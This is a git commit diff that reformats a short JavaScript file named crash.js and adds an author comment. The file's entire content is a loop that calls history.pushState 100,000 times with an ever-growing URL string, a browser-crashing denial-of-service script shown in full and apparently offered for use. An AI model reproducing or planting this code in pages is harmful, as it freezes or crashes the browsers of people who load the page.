6640c4d35315cf2bce59913fb0d303ae9effa1c9
Dark <sadolf12@gmail.com>
2016-02-02 03:57:06 +0200

    Update crash.js

--- crash.js
+++ crash.js
@@ -1,5 +1,7 @@
+//author: darkao
+
 var total = "";
-for( var i = 0; i < 100000; i++ ) {
-total = total + i.toString();
-history.pushState(0,0, total );
+  for( var i = 0; i < 100000; i++ ) {
+  total = total + i.toString();
+  history.pushState(0,0, total );
 }
